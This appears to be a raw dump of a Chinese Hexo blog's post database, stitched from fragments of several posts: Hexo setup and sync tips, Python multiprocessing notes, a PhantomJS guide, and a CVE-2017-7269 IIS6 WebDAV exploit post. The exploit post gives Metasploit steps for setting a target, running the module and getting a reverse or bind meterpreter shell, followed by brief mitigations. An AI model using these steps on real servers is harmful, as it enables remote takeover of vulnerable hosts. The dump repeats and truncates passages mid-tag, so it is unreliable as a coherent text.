[love.js](https://github.com/Neveryu/Neveryu.github.io/blob/master/js/src/love.js) 文件添加到 \\themes\\next\\source\\js\\src 文件目录下。\n找到 \\themes\\next\\layout\\_layout.swing 文件， 在文件的后面，</body> 标签之前 添加以下代码：\n```bash\n<!-- 页面点击小红心 -->\n<script type=\"text/javascript\" src=\"/js/src/love.js\"></script>\n```\n#### 背景的设置\n将 [particle.js](https://github.com/Neveryu/Neveryu.github.io/blob/master/js/src/particle.js) 文件添加到 \\themes\\next\\source\\js\\src 文件目录下。\n找到 \\themes\\next\\layout\\_layout.swing 文件， 在文件的后面，</body>标签之前 添加以下代码：\n```bash\n<!-- 背景动画 -->\n<script type=\"text/javascript\" src=\"/js/src/particle.js\"></script>\n```\n#### 修改文章内链接文本样式\n将链接文本设置为蓝色，鼠标划过时文字颜色加深，并显示下划线。\n找到文件 themes\\next\\source\\css\\_custom\\custom.styl ，添加如下 css 样式：\n```bash\n.post-body p a {\n  color: #0593d3;\n  border-bottom: none;\n  &:hover {\n    color: #0477ab;\n    text-decoration: underline;\n  }\n}\n```\n参考：https://neveryu.github.io/2016/09/30/hexo-next-two/\n\n#### 增加阅读排行统计页面\n首先我们可以使用leancloud来统计页面阅读数量，以及储存这些信息，然后通过leancloud提供的api编写js脚本来获取阅读数量信息，并展示在页面上。\n首先新建一个page页面，hexo new page \"\",然后编辑此.md文件，写下：\n```bash\n<script src=\"https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js\"></script>\n\n<script>AV.initialize(\"\", \"\");</script> //需要写上leancloud的key\n\n<script type=\"text/javascript\">\n  var time=0\n  var title=\"\"\n  var url=\"\"\n  var query = new AV.Query('Counter');//表名\n  query.notEqualTo('id',0); //id不为0的结果\n  query.descending('time'); //结果按阅读次数降序排序\n  query.limit(20);  //最终只返回10条结果\n  query.find().then(function (todo) {\n    for (var i=0;i<10;i++){ \n      var result=todo[i].attributes;\n      time=result.time;  //阅读次数\n      title=result.title; //文章标题\n      url=result.url;     //文章url\n      var content=\"<p>\"+\"<font color='#0477ab'>\"+\"【阅读次数:\"+time+\"】\"+\"<a href='\"+\"http://thief.one\"+url+\"'>\"+title+\"</font>\"+\"</a>\"+\"</p>\";\n      // document.write(\"<a href='\"+\"http://thief.one/\"+url+\"'>\"+title+\"</a>\"+\"    Readtimes:\"+time+\"<br>\");\n      document.getElementById(\"heheda\").innerHTML+=content\n    }\n  }, function (error) {\n    console.log(\"error\");\n  });\n</script>\n```\n最终的效果查看：http://thief.one/count\n\n### 报错解决\n\n#### （一）Deployer not found: git\n当编辑__config.yml文件，将type: git设置完成后，运行hexo g 报错：*git not found*\n解决方案：可以在MyBlog目录下运行: *npm install hexo-deployer-git --save*。\n#### （二）permission denied\n当执行: hexo  deploy 报错时，把__config.yml中的github连接形式从ssh改成http。\n#### （三）当在themes目录下载主题时，报错。\n将该目录只读属性取消。\n#### （四）genrnate 报错\n检查_config.yml配置中，键值对冒号后面是否已经预留了一个半角空格。\n#### （五）ERROR Plugin load failed: hexo-generator-feed\n```bash\nnpm install hexo-generator-feed\nnpm install hexo-generator-feed --save\n```\n#### （六）fatal: The remote end hung up unexpectedly\n```bash\n$ git config https.postBuffer 524288000\n$ git config http.postBuffer 524288000\n$ git config ssh.postBuffer 524288000\n```\n\n#### （七）hero d推送的内容有问题\n　　首先检查下.deploy_git文件夹下的.git文件是否存在，此.git文件指定了hexo d时推送public文件夹，而不是所有的内容。如果此.git文件不存在，则会出现推送内容错误。\n　　用npm install hexo-deployer-git --save生成的.deploy_git不包含.git文件，因此正确的做法是.deploy_git文件夹也需要备份，然后再用npm install hexo-deployer-git --save更新一下其内容即可。\n\n\n### 异地同步博客内容\n　　现在电脑已经很普及了，因为一般来说我们都是公司一台电脑，家里一台电脑，那么如何将两台电脑上博客的内容同步内，即两台电脑上都可以编辑更新博客？\n要解决这个问题，首先我们要清楚我们博客文件的组成：\n\n* node_modules\n* public\n* scaffolds\n* source\n* themes\n* _config_yml\n* db.json\n* package.json\n* .deploy_git\n\n　　以上为利用hexo生成的博客全部内容，那么当我们执行hexo d时，正真被推送到github上的又有哪些内容呢？\n　　我们可以看下github上的tengzhangchao.github.io项目，发现里面只有Public目录下的内容。也就是说，我们博客上呈现的内容，其实就是public下的文件内容。那么这个Pulic目录是怎么生成的呢？\n　　一开始hexo init的时候是没有public目录的，而当我们运行hexo g命令时，public目录被生成了，换句话说hexo g命令就是用来生成博客文件的（会根据_config.yml，source目录文件以及themes目录下文件生成）。同样当我们运行hexo clean命令时，public目录被删除了。\n　　好了，既然我们知道了决定博客显示内容的只有一个Public目录，而public目录又是可以动态生成的，那么其实我们只要在不同电脑上同步可以生成Public目录的文件即可。\n\n以下文件以及目录是必须要同步的：\n\n* source\n* themes\n* _config.yml\n* db.json\n* package.json\n* .deploy_git\n\n　　同步的方式有很多种，可以每次更新后都备份到一个地址。我采用github去备份，也就是新建一个项目用来存放以上文件，每次更新后推送到github上，用作备份同步。\n　　同步完必须的文件后，怎么再其他电脑上也可以更新博客呢？\n　　前提假设我们现在配置了一台新电脑，里面没有安装任何有关博客的东西，那么我们开始吧：\n\n* 下载node.js并安装（官网下载安装），默认会安装npm。\n* 下载安装git（官网下载安装）\n* 下载安装hexo。方法：打开cmd 运行*npm install -g hexo*（要翻墙） \n* 新建一个文件夹，如MyBlog\n* 进入该文件夹内，右击运行git，输入：*hexo init*（生成hexo模板，可能要翻墙)\n\n　　我们重复了一开始搭建博客的步骤，重新生成了一个新的模板，这个模板中包含了hexo生成的一些文件。\n\n* git clone 我们备份的项目，生成一个文件夹，如：MyBlogData\n* 将MyBlog里面的node_modules、scaffolds文件夹复制到MyBlogData里面。\n\n　　做完这些，从表面上看，两台电脑上MyBlogData目录下的文件应该都是一样的了。那么我们运行hexo g\nhexo d试试，如果会报错，则往下看。\n\n* 这是因为.deploy_git没有同步，在MyBlogData目录内运行:*npm install hexo-deployer-git --save*后再次推送即可\n\n　　总结流程：当我们每次更新MyBlog内容后，先利用hexo将public推送到github，然后再将其余必须同步的文件利用git推送到github。\n\n### MakeDown语法\n```bash\n[hexo](http://www.baidu.com)  表示超链接\n##大标题\n###小标题\n<!-- more -->\n<!-- 标签别名 -->\n{% cq %}blah blah blah{% endcq %}\n空格  中文全角空格表示\n---\n文章标题\n---\n>内容     区块引用\n*1\n*2\n*3\n列表\n*内容*     表示强调内容\n![Alt text](/path/to/img.jpg)  图片\n![](/upload_image/20161012/1.png)\n```\n\n详细参考：[MakeDown语法](http://www.appinn.com/markdown/)\n\n\n\n*提醒：在更新博客内容时，最好先在本地调试完毕后（hexo server），再推送到github上。*","source":"_posts/Hexo搭建博客教程.md","raw":"---\ntitle: Hexo搭建博客教程\ndate: 2017-03-03 14:47:03\ncomments: true\ntags: \n- hexo\n- 博客搭建\ncategories: 技术研究\n---\n<blockquote

\"\",然后编辑此.md文件，写下：\n```bash\n<script src=\"https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js\"></script>\n\n<script>AV.initialize(\"\", \"\");</script> //需要写上leancloud的key\n\n<script type=\"text/javascript\">\n  var time=0\n  var title=\"\"\n  var url=\"\"\n  var query = new AV.Query('Counter');//表名\n  query.notEqualTo('id',0); //id不为0的结果\n  query.descending('time'); //结果按阅读次数降序排序\n  query.limit(20);  //最终只返回10条结果\n  query.find().then(function (todo) {\n    for (var i=0;i<10;i++){ \n      var result=todo[i].attributes;\n      time=result.time;  //阅读次数\n      title=result.title; //文章标题\n      url=result.url;     //文章url\n      var content=\"<p>\"+\"<font color='#0477ab'>\"+\"【阅读次数:\"+time+\"】\"+\"<a href='\"+\"http://thief.one\"+url+\"'>\"+title+\"</font>\"+\"</a>\"+\"</p>\";\n      // document.write(\"<a href='\"+\"http://thief.one/\"+url+\"'>\"+title+\"</a>\"+\"    Readtimes:\"+time+\"<br>\");\n      document.getElementById(\"heheda\").innerHTML+=content\n    }\n  }, function (error) {\n    console.log(\"error\");\n  });\n</script>\n```\n最终的效果查看：http://thief.one/count\n\n### 报错解决\n\n#### （一）Deployer not found: git\n当编辑__config.yml文件，将type: git设置完成后，运行hexo g 报错：*git not found*\n解决方案：可以在MyBlog目录下运行: *npm install hexo-deployer-git --save*。\n#### （二）permission denied\n当执行: hexo  deploy 报错时，把__config.yml中的github连接形式从ssh改成http。\n#### （三）当在themes目录下载主题时，报错。\n将该目录只读属性取消。\n#### （四）genrnate 报错\n检查_config.yml配置中，键值对冒号后面是否已经预留了一个半角空格。\n#### （五）ERROR Plugin load failed: hexo-generator-feed\n```bash\nnpm install hexo-generator-feed\nnpm install hexo-generator-feed --save\n```\n#### （六）fatal: The remote end hung up unexpectedly\n```bash\n$ git config https.postBuffer 524288000\n$ git config http.postBuffer 524288000\n$ git config ssh.postBuffer 524288000\n```\n\n#### （七）hero d推送的内容有问题\n　　首先检查下.deploy_git文件夹下的.git文件是否存在，此.git文件指定了hexo d时推送public文件夹，而不是所有的内容。如果此.git文件不存在，则会出现推送内容错误。\n　　用npm install hexo-deployer-git --save生成的.deploy_git不包含.git文件，因此正确的做法是.deploy_git文件夹也需要备份，然后再用npm install hexo-deployer-git --save更新一下其内容即可。\n\n\n### 异地同步博客内容\n　　现在电脑已经很普及了，因为一般来说我们都是公司一台电脑，家里一台电脑，那么如何将两台电脑上博客的内容同步内，即两台电脑上都可以编辑更新博客？\n要解决这个问题，首先我们要清楚我们博客文件的组成：\n\n* node_modules\n* public\n* scaffolds\n* source\n* themes\n* _config_yml\n* db.json\n* package.json\n* .deploy_git\n\n　　以上为利用hexo生成的博客全部内容，那么当我们执行hexo d时，正真被推送到github上的又有哪些内容呢？\n　　我们可以看下github上的tengzhangchao.github.io项目，发现里面只有Public目录下的内容。也就是说，我们博客上呈现的内容，其实就是public下的文件内容。那么这个Pulic目录是怎么生成的呢？\n　　一开始hexo init的时候是没有public目录的，而当我们运行hexo g命令时，public目录被生成了，换句话说hexo g命令就是用来生成博客文件的（会根据_config.yml，source目录文件以及themes目录下文件生成）。同样当我们运行hexo clean命令时，public目录被删除了。\n　　好了，既然我们知道了决定博客显示内容的只有一个Public目录，而public目录又是可以动态生成的，那么其实我们只要在不同电脑上同步可以生成Public目录的文件即可。\n\n以下文件以及目录是必须要同步的：\n\n* source\n* themes\n* _config.yml\n* db.json\n* package.json\n* .deploy_git\n\n　　同步的方式有很多种，可以每次更新后都备份到一个地址。我采用github去备份，也就是新建一个项目用来存放以上文件，每次更新后推送到github上，用作备份同步。\n　　同步完必须的文件后，怎么再其他电脑上也可以更新博客呢？\n　　前提假设我们现在配置了一台新电脑，里面没有安装任何有关博客的东西，那么我们开始吧：\n\n* 下载node.js并安装（官网下载安装），默认会安装npm。\n* 下载安装git（官网下载安装）\n* 下载安装hexo。方法：打开cmd 运行*npm install -g hexo*（要翻墙） \n* 新建一个文件夹，如MyBlog\n* 进入该文件夹内，右击运行git，输入：*hexo init*（生成hexo模板，可能要翻墙)\n\n　　我们重复了一开始搭建博客的步骤，重新生成了一个新的模板，这个模板中包含了hexo生成的一些文件。\n\n* git clone 我们备份的项目，生成一个文件夹，如：MyBlogData\n* 将MyBlog里面的node_modules、scaffolds文件夹复制到MyBlogData里面。\n\n　　做完这些，从表面上看，两台电脑上MyBlogData目录下的文件应该都是一样的了。那么我们运行hexo g\nhexo d试试，如果会报错，则往下看。\n\n* 这是因为.deploy_git没有同步，在MyBlogData目录内运行:*npm install hexo-deployer-git --save*后再次推送即可\n\n　　总结流程：当我们每次更新MyBlog内容后，先利用hexo将public推送到github，然后再将其余必须同步的文件利用git推送到github。\n\n### MakeDown语法\n```bash\n[hexo](http://www.baidu.com)  表示超链接\n##大标题\n###小标题\n<!-- more -->\n<!-- 标签别名 -->\n{% cq %}blah blah blah{% endcq %}\n空格  中文全角空格表示\n---\n文章标题\n---\n>内容     区块引用\n*1\n*2\n*3\n列表\n*内容*     表示强调内容\n![Alt text](/path/to/img.jpg)  图片\n![](/upload_image/20161012/1.png)\n```\n\n详细参考：[MakeDown语法](http://www.appinn.com/markdown/)\n\n\n\n*提醒：在更新博客内容时，最好先在本地调试完毕后（hexo server），再推送到github上。*","slug":"Hexo搭建博客教程","published":1,"updated":"2017-05-12T05:10:05.283Z","layout":"post","photos":[],"link":"","_id":"cj2mmx2w7000enklinzdaa9x7","content":"<p><blockquote

title=\"异地同步博客内容\"></a>异地同步博客内容</h3><p>　　现在电脑已经很普及了，因为一般来说我们都是公司一台电脑，家里一台电脑，那么如何将两台电脑上博客的内容同步内，即两台电脑上都可以编辑更新博客？<br>要解决这个问题，首先我们要清楚我们博客文件的组成：</p>\n<ul>\n<li>node_modules</li>\n<li>public</li>\n<li>scaffolds</li>\n<li>source</li>\n<li>themes</li>\n<li>_config_yml</li>\n<li>db.json</li>\n<li>package.json</li>\n<li>.deploy_git</li>\n</ul>\n<p>　　以上为利用hexo生成的博客全部内容，那么当我们执行hexo d时，正真被推送到github上的又有哪些内容呢？<br>　　我们可以看下github上的tengzhangchao.github.io项目，发现里面只有Public目录下的内容。也就是说，我们博客上呈现的内容，其实就是public下的文件内容。那么这个Pulic目录是怎么生成的呢？<br>　　一开始hexo init的时候是没有public目录的，而当我们运行hexo g命令时，public目录被生成了，换句话说hexo g命令就是用来生成博客文件的（会根据_config.yml，source目录文件以及themes目录下文件生成）。同样当我们运行hexo clean命令时，public目录被删除了。<br>　　好了，既然我们知道了决定博客显示内容的只有一个Public目录，而public目录又是可以动态生成的，那么其实我们只要在不同电脑上同步可以生成Public目录的文件即可。</p>\n<p>以下文件以及目录是必须要同步的：</p>\n<ul>\n<li>source</li>\n<li>themes</li>\n<li>_config.yml</li>\n<li>db.json</li>\n<li>package.json</li>\n<li>.deploy_git</li>\n</ul>\n<p>　　同步的方式有很多种，可以每次更新后都备份到一个地址。我采用github去备份，也就是新建一个项目用来存放以上文件，每次更新后推送到github上，用作备份同步。<br>　　同步完必须的文件后，怎么再其他电脑上也可以更新博客呢？<br>　　前提假设我们现在配置了一台新电脑，里面没有安装任何有关博客的东西，那么我们开始吧：</p>\n<ul>\n<li>下载node.js并安装（官网下载安装），默认会安装npm。</li>\n<li>下载安装git（官网下载安装）</li>\n<li>下载安装hexo。方法：打开cmd 运行<em>npm install -g hexo</em>（要翻墙） </li>\n<li>新建一个文件夹，如MyBlog</li>\n<li>进入该文件夹内，右击运行git，输入：<em>hexo init</em>（生成hexo模板，可能要翻墙)</li>\n</ul>\n<p>　　我们重复了一开始搭建博客的步骤，重新生成了一个新的模板，这个模板中包含了hexo生成的一些文件。</p>\n<ul>\n<li>git clone 我们备份的项目，生成一个文件夹，如：MyBlogData</li>\n<li>将MyBlog里面的node_modules、scaffolds文件夹复制到MyBlogData里面。</li>\n</ul>\n<p>　　做完这些，从表面上看，两台电脑上MyBlogData目录下的文件应该都是一样的了。那么我们运行hexo g<br>hexo d试试，如果会报错，则往下看。</p>\n<ul>\n<li>这是因为.deploy_git没有同步，在MyBlogData目录内运行:<em>npm install hexo-deployer-git –save</em>后再次推送即可</li>\n</ul>\n<p>　　总结流程：当我们每次更新MyBlog内容后，先利用hexo将public推送到github，然后再将其余必须同步的文件利用git推送到github。</p>\n<h3 id=\"MakeDown语法\"><a href=\"#MakeDown语法\" class=\"headerlink\"

title=\"异地同步博客内容\"></a>异地同步博客内容</h3><p>　　现在电脑已经很普及了，因为一般来说我们都是公司一台电脑，家里一台电脑，那么如何将两台电脑上博客的内容同步内，即两台电脑上都可以编辑更新博客？<br>要解决这个问题，首先我们要清楚我们博客文件的组成：</p>\n<ul>\n<li>node_modules</li>\n<li>public</li>\n<li>scaffolds</li>\n<li>source</li>\n<li>themes</li>\n<li>_config_yml</li>\n<li>db.json</li>\n<li>package.json</li>\n<li>.deploy_git</li>\n</ul>\n<p>　　以上为利用hexo生成的博客全部内容，那么当我们执行hexo d时，正真被推送到github上的又有哪些内容呢？<br>　　我们可以看下github上的tengzhangchao.github.io项目，发现里面只有Public目录下的内容。也就是说，我们博客上呈现的内容，其实就是public下的文件内容。那么这个Pulic目录是怎么生成的呢？<br>　　一开始hexo init的时候是没有public目录的，而当我们运行hexo g命令时，public目录被生成了，换句话说hexo g命令就是用来生成博客文件的（会根据_config.yml，source目录文件以及themes目录下文件生成）。同样当我们运行hexo clean命令时，public目录被删除了。<br>　　好了，既然我们知道了决定博客显示内容的只有一个Public目录，而public目录又是可以动态生成的，那么其实我们只要在不同电脑上同步可以生成Public目录的文件即可。</p>\n<p>以下文件以及目录是必须要同步的：</p>\n<ul>\n<li>source</li>\n<li>themes</li>\n<li>_config.yml</li>\n<li>db.json</li>\n<li>package.json</li>\n<li>.deploy_git</li>\n</ul>\n<p>　　同步的方式有很多种，可以每次更新后都备份到一个地址。我采用github去备份，也就是新建一个项目用来存放以上文件，每次更新后推送到github上，用作备份同步。<br>　　同步完必须的文件后，怎么再其他电脑上也可以更新博客呢？<br>　　前提假设我们现在配置了一台新电脑，里面没有安装任何有关博客的东西，那么我们开始吧：</p>\n<ul>\n<li>下载node.js并安装（官网下载安装），默认会安装npm。</li>\n<li>下载安装git（官网下载安装）</li>\n<li>下载安装hexo。方法：打开cmd 运行<em>npm install -g hexo</em>（要翻墙） </li>\n<li>新建一个文件夹，如MyBlog</li>\n<li>进入该文件夹内，右击运行git，输入：<em>hexo init</em>（生成hexo模板，可能要翻墙)</li>\n</ul>\n<p>　　我们重复了一开始搭建博客的步骤，重新生成了一个新的模板，这个模板中包含了hexo生成的一些文件。</p>\n<ul>\n<li>git clone 我们备份的项目，生成一个文件夹，如：MyBlogData</li>\n<li>将MyBlog里面的node_modules、scaffolds文件夹复制到MyBlogData里面。</li>\n</ul>\n<p>　　做完这些，从表面上看，两台电脑上MyBlogData目录下的文件应该都是一样的了。那么我们运行hexo g<br>hexo d试试，如果会报错，则往下看。</p>\n<ul>\n<li>这是因为.deploy_git没有同步，在MyBlogData目录内运行:<em>npm install hexo-deployer-git –save</em>后再次推送即可</li>\n</ul>\n<p>　　总结流程：当我们每次更新MyBlog内容后，先利用hexo将public推送到github，然后再将其余必须同步的文件利用git推送到github。</p>\n<h3 id=\"MakeDown语法\"><a href=\"#MakeDown语法\" class=\"headerlink\"

Usage\n　　新建一个文件,如：cve-2017-7269.rb，将以上代码复制进去（或者直接下载该文件）。\n　　找到metasploit安装目录，将cve-2017-7269.rb文件放到opt/metasploit/apps/pro/msf3/modules/exploit/windows/iis/目录下。（我在mac上试的，目录有所不同，放在这个目录下是为了方便分类管理）。\n\n运行msfconsole并加载cve-2017-7269模块\n\n```bash\n>use exploit/windows/iis/cvce-2017-7269\n>set RHOST 192.168.4.244     #设置目标IP\n>exploit\n```\n![](/upload_image/20170329/1.png)\n　　运行exploit，会在本机监听4444端口，存在漏洞的目标服务器会连上本机的4444端口，反弹一个meterpreter。（前提是目标服务器能够ping通本机）\n![](/upload_image/20170329/2.png)\n通过meterpreter执行shell命令，反弹cmdshell\n![](/upload_image/20170329/3.png)\n　　此模块默认会加载reverse_tcp payload，用于让目标服务器远程连接本地的某个端口，当然我们也可以改变payload，将其改为bind_tcp，用于让目标服务器监听一个端口，本地主动连接弹出shell。\n```bash\n>set PAYLOAD windows/meterpreter/bind_tcp\n```\n改完之后，再次测试\n![](/upload_image/20170329/4.png)\n　　运行exploit，目标服务器监听4444端口，本机会连上目标的4444端口，反弹一个meterpreter。（前提是本机能够ping通目标服务器）\n\n在msf模块中输入set，可查看能够修改的项目，比show options要全一点。\n![](/upload_image/20170329/5.png)\n\n### 临时解决办法\n* 关闭WebDAV服务\n* 使用相关防护设备\n\n\n\n>转载请说明出处:[IIS6-0远程命令执行漏洞-CVE-2017-7269 |

Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。\n漏洞类型：缓冲区溢出\n漏洞等级：高危\n影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证，其他版本尚未验证）\n触发函数：ScStoragePathFromUrl函数\n附加信息：ScStoragePathFromUrl函数被调用了两次\n漏洞细节：在Windows Server 2003的IIS6.0的WebDAV服务的ScStoragePathFromUrl函数存在缓存区溢出漏洞，攻击者通过一个以“If: <Http://”开始的较长header头的PROPFIND请求执行任意代码。\n\n### 利用条件\n\n* iis6.0\n* 开启WebDav功能（具体为PROPFIND方法，成功则返回207或者200）\n* windows server 2003 R2\n\n### Poc\n```bash\n#------------Our payload set up a ROP chain by

Usage\n　　新建一个文件,如：cve-2017-7269.rb，将以上代码复制进去（或者直接下载该文件）。\n　　找到metasploit安装目录，将cve-2017-7269.rb文件放到opt/metasploit/apps/pro/msf3/modules/exploit/windows/iis/目录下。（我在mac上试的，目录有所不同，放在这个目录下是为了方便分类管理）。\n\n运行msfconsole并加载cve-2017-7269模块\n\n```bash\n>use exploit/windows/iis/cvce-2017-7269\n>set RHOST 192.168.4.244     #设置目标IP\n>exploit\n```\n![](/upload_image/20170329/1.png)\n　　运行exploit，会在本机监听4444端口，存在漏洞的目标服务器会连上本机的4444端口，反弹一个meterpreter。（前提是目标服务器能够ping通本机）\n![](/upload_image/20170329/2.png)\n通过meterpreter执行shell命令，反弹cmdshell\n![](/upload_image/20170329/3.png)\n　　此模块默认会加载reverse_tcp payload，用于让目标服务器远程连接本地的某个端口，当然我们也可以改变payload，将其改为bind_tcp，用于让目标服务器监听一个端口，本地主动连接弹出shell。\n```bash\n>set PAYLOAD windows/meterpreter/bind_tcp\n```\n改完之后，再次测试\n![](/upload_image/20170329/4.png)\n　　运行exploit，目标服务器监听4444端口，本机会连上目标的4444端口，反弹一个meterpreter。（前提是本机能够ping通目标服务器）\n\n在msf模块中输入set，可查看能够修改的项目，比show options要全一点。\n![](/upload_image/20170329/5.png)\n\n### 临时解决办法\n* 关闭WebDAV服务\n* 使用相关防护设备\n\n\n\n>转载请说明出处:[IIS6-0远程命令执行漏洞-CVE-2017-7269 |

run(), join()等方法。Process类适合简单的进程创建，如需资源共享可以结合multiprocessing.Queue使用；如果想要控制进程数量，则建议使用进程池[Pool](http://thief.one/2016/11/24/Multiprocessing-Pool)类。\n#### Process介绍\n\n##### 构造方法：\n* Process([group [, target [, name [, args [, kwargs]]]]])\n* group: 线程组，目前还没有实现，库引用中提示必须是None；\n* target: 要执行的方法；\n* name: 进程名；\n* args/kwargs: 要传入方法的参数。\n\n##### 实例方法：\n* is_alive()：返回进程是否在运行。\n* join([timeout])：阻塞当前上下文环境的进程程，直到调用此方法的进程终止或到达指定的timeout（可选参数）。\n* start()：进程准备就绪，等待CPU调度。\n* run()：strat()调用run方法，如果实例进程时未制定传入target，这star执行t默认run()方法。\n* terminate()：不管任务是否完成，立即停止工作进程。\n\n##### 属性：\n* authkey\n* daemon：和线程的setDeamon功能一样（将父进程设置为守护进程，当父进程结束时，子进程也结束）。\n* exitcode(进程在运行时为None、如果为–N，表示被信号N结束）。\n* name：进程名字。\n* pid：进程号。\n\n\n#### 创建多进程的两种方法\n\nProcess类中，可以使用两种方法创建子进程。\n\n##### 使用Process创建子进程\n\n说明：用法与Threading相似\n\n```bash\nfrom multiprocessing import Process  #导入Process模块 \nimport os  \n\ndef test(name):\n\t'''\n\t函数输出当前进程ID，以及其父进程ID。\n\t此代码应在Linux下运行，因为windows下os模块不支持getppid()\n\t'''\n    print \"Process ID： %s\" % (os.getpid())  \n    print \"Parent Process ID： %s\" % (os.getppid())  \n\n\nif __name__ == \"__main__\": \n\t'''\n\twindows下，创建进程的代码一下要放在main函数里面\n\t''' \n    proc = Process(target=test, args=('nmask',))  \n    proc.start()  \n    proc.join()  \n```\n\n##### 使用Process类继承创建子进程\n\n说明：通过继承Process类，修改run函数代码。\n\n```bash\nfrom multiprocessing import Process\nimport time\n\nclass MyProcess(Process):\n'''\n继承Process类，类似threading.Thread\n'''\n    def __init__(self, arg):\n        super(MyProcess, self).__init__()\n        #multiprocessing.Process.__init__(self)\n        self.arg = arg\n\n    def run(self):\n    '''\n    重构run函数\n    '''\n

Queue类\n\n使用Multiprocessing.Queue类，共享资源（share memory）（只适用Process类）\n\n```bash\nfrom multiprocessing import Process, Queue  \n\ndef test(queue):  \n    queue.put(\"Hello World\")  \n\nif __name__ == '__main__':\n    q = Queue()  \n    p = Process(target=test, args=(q,))  #需要将q对象传递给子进程\n    p.start()\n\n    print q.get()  \n```\n缺点：不能再Pool进程池中使用。\n\n### Array、Value类\n\n使用Multiprocessing.Array类，共享资源（share memory）（只适用于Process类）\n\n```bash\nfrom multiprocessing import Process, Array\n\ndef test(a):\n    for i in range(len(a)):\n        a[i] = -a[i]\n\nif __name__ == '__main__':\n    arr = Array('i', range(10))\n    p = Process(target=test, args=(arr))  #需要将arr对象传递给子进程\n    p.start()\n    p.join()\n    print arr[:]\n\n```\n缺点：无法与Pool一起使用。\n\n### Manager类\n\n使用Multiprocessing.Manager类，共享资源。（可以适用Pool类）\n\n说明：由于windows操作系统下，创建Multiprocessing类对象代码一定要放在main()函数下，而linux不需要，因此这里区分2个版本。\n\n实例目的：父进程在执行子进程的过程中，同步判断一个公共资源值，如果满足条件则结束所有进程。\n\n#### linux版本\n```bash\nfrom multiprocessing import Manager,Pool\n\nlists=Manager().list()    ##定义可被子进程共享的全局变量lists\n\ndef test(i):\n     print i\n     lists.append(i)\n\nif __name__==\"__main__\":\n    pool=Pool()\n    for i in xrange(10000000):\n    \t'''\n    \t判断如果lists长度大于0，则不再往进程池中添加进程。\n    \t'''\n        if len(lists)<=0:\n            pool.apply_async(test,args=(i,))\n        else:\n            break\n     pool.close()\n     pool.join()\n```\n优点：可以跟Pool一起用，且速度比较快。\n\n\n#### windows版本\n\n```bash\nfrom multiprocessing import Manager\n\ndef test(i,lists):\n     print i\n     lists.append(i)\n\nif __name__==\"__main__\":\n    pool=Pool()\n    lists=Manager().list() #Manager类实例化代码只能写在main()函数里面\n    for i in xrange(10000000):\n        if len(lists)<=0:\n        \t'''\n

【Multiprocessing系列】共享资源\ndate: 2016-11-24 10:53:41\ncomments: true\ntags: \n- python\n- Multiprocessing\n- 多进程\ncategories: 编程之道\n---\n　　在使用多进程的过程中，最好不要使用共享资源，如果非得使用，则请往下看。Multiprocessing类中共享资源可以使用3种方式，分别是Queue，Array，Manager。这三个都是Multiprocessing自带的组件，使用起来也非常方便。注意：普通的全局变量是不能被子进程所共享的，只有通过Multiprocessing组件构造的数据结构可以被共享。\n\n### Queue类\n\n使用Multiprocessing.Queue类，共享资源（share memory）（只适用Process类）\n\n```bash\nfrom multiprocessing import Process, Queue  \n\ndef test(queue):  \n    queue.put(\"Hello World\")  \n\nif __name__ == '__main__':\n    q = Queue()  \n    p = Process(target=test, args=(q,))  #需要将q对象传递给子进程\n    p.start()\n\n    print q.get()  \n```\n缺点：不能再Pool进程池中使用。\n\n### Array、Value类\n\n使用Multiprocessing.Array类，共享资源（share memory）（只适用于Process类）\n\n```bash\nfrom multiprocessing import Process, Array\n\ndef test(a):\n    for i in range(len(a)):\n        a[i] = -a[i]\n\nif __name__ == '__main__':\n    arr = Array('i', range(10))\n    p = Process(target=test, args=(arr))  #需要将arr对象传递给子进程\n    p.start()\n    p.join()\n    print arr[:]\n\n```\n缺点：无法与Pool一起使用。\n\n### Manager类\n\n使用Multiprocessing.Manager类，共享资源。（可以适用Pool类）\n\n说明：由于windows操作系统下，创建Multiprocessing类对象代码一定要放在main()函数下，而linux不需要，因此这里区分2个版本。\n\n实例目的：父进程在执行子进程的过程中，同步判断一个公共资源值，如果满足条件则结束所有进程。\n\n#### linux版本\n```bash\nfrom multiprocessing import Manager,Pool\n\nlists=Manager().list()    ##定义可被子进程共享的全局变量lists\n\ndef test(i):\n     print i\n     lists.append(i)\n\nif __name__==\"__main__\":\n    pool=Pool()\n    for i in xrange(10000000):\n    \t'''\n    \t判断如果lists长度大于0，则不再往进程池中添加进程。\n    \t'''\n        if len(lists)<=0:\n            pool.apply_async(test,args=(i,))\n        else:\n            break\n     pool.close()\n     pool.join()\n```\n优点：可以跟Pool一起用，且速度比较快。\n\n\n#### windows版本\n\n```bash\nfrom multiprocessing import Manager\n\ndef test(i,lists):\n     print i\n     lists.append(i)\n\nif __name__==\"__main__\":\n    pool=Pool()\n    lists=Manager().list() #Manager类实例化代码只能写在main()函数里面\n    for i in xrange(10000000):\n        if len(lists)<=0:\n        \t'''\n        \t在创建子进程时，需要将lists对象传入，不然无法共享。\n        \t'''\n            pool.apply_async(test,args=(i,lists))##需要将lists对象传递给子进程，这里比较耗资源，原因可能是因为Manager类是基于通信的。\n        else:\n

-->\n　　phantomjs全面支持web而不需要浏览器，又称为无头浏览器，它是一个基于webkit的服务端javascript API，可以用于页面自动化，网络监测，网页截图，爬虫抓取等。phantomjs有很多api接口，接口语法用的就是js的语法，phantom提供了类，实例化以后可以调用对象的方法，通过回调函数可以实现自己想要的功能，其APi主要有web服务端Api、webPage APi、System APi等，这里主要介绍几种常用的api的用法。\n\n### phantomjs-Command Line Interface\n描述：phantomjs命令行用法以及参数设置\n首先我们看下如何调用phantomjs运行js脚本\n```bash\nphantomjs [options] somescript.js [arg1 [arg2 [...]]]\n```\n可选参数：（只列举常用的）\n\n* --disk-cache=[true|false] 缓存设置\n* --ignore-ssl-errors=[true|false] 忽略ssl错误\n* --load-images=[true|false] 加载图片\n* --proxy=address:port  设置代理\n\n有很多参数，不一一列举，详细参考：[phantomjs-Command Line Interface](http://phantomjs.org/api/command-line.html)\n\n### phantomjs-system module\n描述：phantomjs系统操作APi\n文档地址：[phantomjs-system module](http://phantomjs.org/api/system/)\n作用：用于system系统操作\n\n#### args（获取程序输入参数）\n代码（test.js）\n```bash\nvar system = require('system');\nvar args = system.args;\n\nif (args.length === 1) {\n  console.log('Try to pass some arguments when invoking this script!');\n} else {\n  args.forEach(function(arg, i) {\n    console.log(i + ': ' + arg);\n  